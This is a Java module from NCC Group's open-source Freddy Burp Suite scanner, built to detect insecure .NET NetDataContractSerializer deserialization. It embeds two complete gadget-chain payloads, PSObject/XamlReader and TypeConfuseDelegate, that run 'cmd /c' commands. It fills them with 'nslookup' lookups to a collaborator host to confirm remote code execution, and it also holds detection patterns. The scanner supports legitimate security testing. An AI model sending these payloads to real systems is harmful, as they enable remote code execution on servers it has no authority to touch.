// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the .NET NetDataContractSerializer API.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class NetDataContractSerializerModule extends FreddyModuleBase {
	//PSObject payload data
	private static final String PSO_PREFIX = "<PsObjectMarshal z:Id=\"1\" z:FactoryType=\"a:PSObject\" z:Type=\"System.Management.Automation.PSObject\" z:Assembly=\"System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" xmlns=\"http://schemas.datacontract.org/2004/07/ysoserial.Generators\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\" xmlns:a=\"http://schemas.datacontract.org/2004/07/System.Management.Automation\"><CliXml z:Id=\"2\" z:Type=\"System.String\" z:Assembly=\"0\" xmlns=\"\">&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;&amp;#xD;&lt;Obj RefId=\"0\"&gt;&amp;#xD;&lt;TN RefId=\"0\"&gt;&amp;#xD;&lt;T&gt;Microsoft.Management.Infrastructure.CimInstance#System.Management.Automation/RunspaceInvoke5&lt;/T&gt;&amp;#xD;&lt;T&gt;Microsoft.Management.Infrastructure.CimInstance#RunspaceInvoke5&lt;/T&gt;&amp;#xD;&lt;T&gt;Microsoft.Management.Infrastructure.CimInstance&lt;/T&gt;&amp;#xD;&lt;T&gt;System.Object&lt;/T&gt;&amp;#xD;&lt;/TN&gt;&amp;#xD;&lt;ToString&gt;RunspaceInvoke5&lt;/ToString&gt;&amp;#xD;&lt;Obj RefId=\"1\"&gt;&amp;#xD;&lt;TNRef RefId=\"0\" /&gt;&amp;#xD;&lt;ToString&gt;RunspaceInvoke5&lt;/ToString&gt;&amp;#xD;&lt;Props&gt;&amp;#xD;&lt;Nil N=\"PSComputerName\" /&gt;&amp;#xD;&lt;Obj N=\"test1\" RefId =\"20\" &gt; &amp;#xD;&lt;TN RefId=\"1\" &gt; &amp;#xD;&lt;T&gt;System.Windows.Markup.XamlReader[], PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/T&gt;&amp;#xD;&lt;T&gt;System.Array&lt;/T&gt;&amp;#xD;&lt;T&gt;System.Object&lt;/T&gt;&amp;#xD;&lt;/TN&gt;&amp;#xD;&lt;LST&gt;&amp;#xD;&lt;S N=\"Hash\" &gt;&amp;lt;ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:System=\"clr-namespace:System;assembly=mscorlib\" xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\"&amp;gt;&amp;lt;ObjectDataProvider x:Key=\"LaunchCalc\" ObjectType = \"{ x:Type Diag:Process}\" MethodName = \"Start\" &amp;gt;&amp;lt;ObjectDataProvider.MethodParameters&amp;gt;&amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;&amp;lt;System:String&amp;gt;/c \"";
	private static final String PSO_SUFFIX = "\" &amp;lt;/System:String&amp;gt;&amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;&amp;lt;/ObjectDataProvider&amp;gt;&amp;lt;/ResourceDictionary&amp;gt;&lt;/S&gt;&amp;#xD;&lt;/LST&gt;&amp;#xD;&lt;/Obj&gt;&amp;#xD;&lt;/Props&gt;&amp;#xD;&lt;MS&gt;&amp;#xD;&lt;Obj N=\"__ClassMetadata\" RefId =\"2\"&gt; &amp;#xD;&lt;TN RefId=\"1\" &gt; &amp;#xD;&lt;T&gt;System.Collections.ArrayList&lt;/T&gt;&amp;#xD;&lt;T&gt;System.Object&lt;/T&gt;&amp;#xD;&lt;/TN&gt;&amp;#xD;&lt;LST&gt;&amp;#xD;&lt;Obj RefId=\"3\"&gt; &amp;#xD;&lt;MS&gt;&amp;#xD;&lt;S N=\"ClassName\"&gt;RunspaceInvoke5&lt;/S&gt;&amp;#xD;&lt;S N=\"Namespace\"&gt;System.Management.Automation&lt;/S&gt;&amp;#xD;&lt;Nil N=\"ServerName\" /&gt;&amp;#xD;&lt;I32 N=\"Hash\"&gt;460929192&lt;/I32&gt;&amp;#xD;&lt;S N=\"MiXml\"&gt; &amp;lt;CLASS NAME=\"RunspaceInvoke5\" &amp;gt;&amp;lt;PROPERTY NAME=\"test1\" TYPE =\"string\" &amp;gt;&amp;lt;/PROPERTY&amp;gt;&amp;lt;/CLASS&amp;gt;&lt;/S&gt;&amp;#xD;&lt;/MS&gt;&amp;#xD;&lt;/Obj&gt;&amp;#xD;&lt;/LST&gt;&amp;#xD;&lt;/Obj&gt;&amp;#xD;&lt;/MS&gt;&amp;#xD;&lt;/Obj&gt;&amp;#xD;&lt;MS&gt;&amp;#xD;&lt;Ref N=\"__ClassMetadata\" RefId =\"2\" /&gt;&amp;#xD;&lt;/MS&gt;&amp;#xD;&lt;/Obj&gt;&amp;#xD;&lt;/Objs&gt;</CliXml></PsObjectMarshal>";
	
	//TypeConfuseDelegate payload data
	private static final String TCD_PREFIX = "<ArrayOfstring z:Id=\"1\" z:Type=\"System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\" z:Assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\" xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\"><Count z:Id=\"2\" z:Type=\"System.Int32\" z:Assembly=\"0\" xmlns=\"\">2</Count><Comparer z:Id=\"3\" z:Type=\"System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]\" z:Assembly=\"0\" xmlns=\"\"><_comparison z:Id=\"4\" z:FactoryType=\"a:DelegateSerializationHolder\" z:Type=\"System.DelegateSerializationHolder\" z:Assembly=\"0\" xmlns=\"http://schemas.datacontract.org/2004/07/System.Collections.Generic\" xmlns:a=\"http://schemas.datacontract.org/2004/07/System\"><Delegate z:Id=\"5\" z:Type=\"System.DelegateSerializationHolder+DelegateEntry\" z:Assembly=\"0\" xmlns=\"\"><a:assembly z:Id=\"6\">mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:assembly><a:delegateEntry z:Id=\"7\"><a:assembly z:Ref=\"6\" i:nil=\"true\"/><a:delegateEntry i:nil=\"true\"/><a:methodName z:Id=\"8\">Compare</a:methodName><a:target i:nil=\"true\"/><a:targetTypeAssembly z:Ref=\"6\" i:nil=\"true\"/><a:targetTypeName z:Id=\"9\">System.String</a:targetTypeName><a:type z:Id=\"10\">System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type></a:delegateEntry><a:methodName z:Id=\"11\">Start</a:methodName><a:target i:nil=\"true\"/><a:targetTypeAssembly z:Id=\"12\">System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:targetTypeAssembly><a:targetTypeName z:Id=\"13\">System.Diagnostics.Process</a:targetTypeName><a:type z:Id=\"14\">System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type></Delegate><method0 z:Id=\"15\" z:FactoryType=\"b:MemberInfoSerializationHolder\" z:Type=\"System.Reflection.MemberInfoSerializationHolder\" z:Assembly=\"0\" xmlns=\"\" xmlns:b=\"http://schemas.datacontract.org/2004/07/System.Reflection\"><Name z:Ref=\"11\" i:nil=\"true\"/><AssemblyName z:Ref=\"12\" i:nil=\"true\"/><ClassName z:Ref=\"13\" i:nil=\"true\"/><Signature z:Id=\"16\" z:Type=\"System.String\" z:Assembly=\"0\">System.Diagnostics.Process Start(System.String, System.String)</Signature><Signature2 z:Id=\"17\" z:Type=\"System.String\" z:Assembly=\"0\">System.Diagnostics.Process Start(System.String, System.String)</Signature2><MemberType z:Id=\"18\" z:Type=\"System.Int32\" z:Assembly=\"0\">8</MemberType><GenericArguments i:nil=\"true\"/></method0><method1 z:Id=\"19\" z:FactoryType=\"b:MemberInfoSerializationHolder\" z:Type=\"System.Reflection.MemberInfoSerializationHolder\" z:Assembly=\"0\" xmlns=\"\" xmlns:b=\"http://schemas.datacontract.org/2004/07/System.Reflection\"><Name z:Ref=\"8\" i:nil=\"true\"/><AssemblyName z:Ref=\"6\" i:nil=\"true\"/><ClassName z:Ref=\"9\" i:nil=\"true\"/><Signature z:Id=\"20\" z:Type=\"System.String\" z:Assembly=\"0\">Int32 Compare(System.String, System.String)</Signature><Signature2 z:Id=\"21\" z:Type=\"System.String\" z:Assembly=\"0\">System.Int32 Compare(System.String, System.String)</Signature2><MemberType z:Id=\"22\" z:Type=\"System.Int32\" z:Assembly=\"0\">8</MemberType><GenericArguments i:nil=\"true\"/></method1></_comparison></Comparer><Version z:Id=\"23\" z:Type=\"System.Int32\" z:Assembly=\"0\" xmlns=\"\">2</Version><Items z:Id=\"24\" z:Type=\"System.String[]\" z:Assembly=\"0\" z:Size=\"2\" xmlns=\"\"><string z:Id=\"25\" xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">/c ";
	private static final String TCD_SUFFIX = "</string><string z:Id=\"26\" xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">cmd</string></Items></ArrayOfstring>";
	
	protected void initialiseModule() {
		setName("NetDataContractSerializer");
		setPlatform(TargetPlatform.DOTNET);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		registerPassiveScanIndicator(new Pattern[] {Pattern.compile("type((=)|(%3d))((\")|(%22))", Pattern.CASE_INSENSITIVE), Pattern.compile("assembly((=)|(%3d))((\")|(%22))", Pattern.CASE_INSENSITIVE)}, IndicatorTarget.REQUEST);
		registerPassiveScanIndicator("NetDataContractSerializer.InternalReadObject", IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload("<test/>", "NetDataContractSerializer.InternalReadObject");
		
		registerActiveScanCollaboratorPayload(PN_PSOBJ, false);
		registerActiveScanCollaboratorPayload(PN_TYPCONDEL, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_PSOBJ:
				return PSO_PREFIX + "nslookup " + hostname + PSO_SUFFIX;
				
			case PN_TYPCONDEL:
				return TCD_PREFIX + "nslookup " + hostname + TCD_SUFFIX;
		}
		return null;
	}
}
